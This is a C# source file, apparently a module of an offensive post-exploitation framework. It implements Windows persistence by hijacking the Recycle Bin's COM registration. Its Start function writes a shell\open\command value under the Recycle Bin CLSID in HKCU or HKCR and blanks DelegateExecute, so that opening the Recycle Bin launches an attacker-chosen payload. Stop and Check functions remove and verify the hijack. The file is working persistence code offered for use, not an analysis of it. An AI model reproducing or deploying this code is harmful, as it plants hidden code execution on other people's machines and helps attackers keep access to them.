using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RecycleGuid = "{645FF040-5081-101B-9F08-00AA002F954E}";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 recycle_bin Start hkcu-recycle {defaultPayload}\n" +
                   $"    (Target hives: 'hkcu-recycle' [User], 'hkcr-recycle' [Machine])";
        }

        public static string Start(string[] args)
        {
            string targetHive = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "hkcu-recycle";

            string payloadPath = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var baseKey = OpenForWrite(targetHive, create: true);
                if (baseKey == null)
                    return $"[-] Access denied opening or creating registry hive path for '{targetHive}'.";

                using var shellKey = baseKey.CreateSubKey("shell");
                using var openKey = shellKey?.CreateSubKey("open");
                using var commandKey = openKey?.CreateSubKey("command");

                if (commandKey == null)
                    return "[-] Failed to create the 'shell\\open\\command' subkeys.";

                var existing = commandKey.GetValue("")?.ToString();
                if (!string.IsNullOrEmpty(existing) && existing != "DelegateExecute")
                {
                    if (existing.IndexOf(".exe", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        existing.IndexOf(".bat", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        existing.IndexOf(".ps1", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        return $"[*] Recycle Bin is already hijacked with payload: {existing}";
                    }
                }

                // 1. Assign execution payload
                commandKey.SetValue("", $"\"{payloadPath}\"", RegistryValueKind.String);

                // 2. Clear DelegateExecute to force application verb override
                commandKey.SetValue("DelegateExecute", "", RegistryValueKind.String);

                return $"[+] Successfully hijacked Recycle Bin in '{targetHive.ToUpper()}' -> Payload: '\"{payloadPath}\"' (DelegateExecute bypassed)";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Modifying target registry context requires elevated privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string targetHive = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "hkcu-recycle";

            try
            {
                using var baseKey = OpenForWrite(targetHive, create: false);
                if (baseKey == null)
                    return $"[-] Target registry path '{targetHive}' not found or inaccessible.";

                using var shellKey = baseKey.OpenSubKey("shell", writable: true);
                if (shellKey == null)
                    return $"[*] No hijack found in '{targetHive.ToUpper()}'. 'shell' subkey does not exist.";

                shellKey.DeleteSubKeyTree("open", throwOnMissingSubKey: false);

                if (shellKey.SubKeyCount == 0 && shellKey.ValueCount == 0)
                {
                    shellKey.Close();
                    baseKey.DeleteSubKey("shell", throwOnMissingSubKey: false);
                }

                return $"[+] Successfully restored native Recycle Bin functionality in '{targetHive.ToUpper()}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Registry removal requires appropriate privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string targetHive = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "hkcu-recycle";

            try
            {
                using var baseKey = OpenForRead(targetHive);
                if (baseKey == null)
                    return $"[-] Target registry key structure for '{targetHive.ToUpper()}' not found.";

                using var commandKey = baseKey.OpenSubKey(@"shell\open\command");
                if (commandKey == null)
                    return $"[*] No Recycle Bin hijack configured in '{targetHive.ToUpper()}'.";

                var payload = commandKey.GetValue("")?.ToString();
                var delegateExecute = commandKey.GetValue("DelegateExecute");

                if (string.IsNullOrEmpty(payload))
                    return $"[*] 'shell\\open\\command' exists in '{targetHive.ToUpper()}' but payload path is empty.";

                if (delegateExecute == null)
                    return $"[-] WARNING: Payload '{payload}' is set, but required 'DelegateExecute' bypass value is missing.";

                return $"[+] Verified Recycle Bin hijack in '{targetHive.ToUpper()}' -> Payload: '{payload}' (DelegateExecute bypassed)";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied checking registry parameters.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }

        // ─── Path Resolution Engine ───────────────────────────────────────────────

        private static RegistryKey OpenForWrite(string targetKey, bool create)
        {
            var (hive, path) = ResolvePath(targetKey);
            return create
                ? hive.CreateSubKey(path, writable: true)
                : hive.OpenSubKey(path, writable: true);
        }

        private static RegistryKey OpenForRead(string targetKey)
        {
            var (hive, path) = ResolvePath(targetKey);
            return hive.OpenSubKey(path, writable: false);
        }

        private static (RegistryKey hive, string path) ResolvePath(string targetKey)
        {
            return (targetKey ?? string.Empty).ToLower() switch
            {
                "hkcr-recycle" => (Registry.ClassesRoot, $@"CLSID\{RecycleGuid}"),
                "hkcu-recycle" => (Registry.CurrentUser, $@"Software\Classes\CLSID\{RecycleGuid}"),
                _              => (Registry.CurrentUser, $@"Software\Classes\CLSID\{RecycleGuid}")
            };
        }
    }
}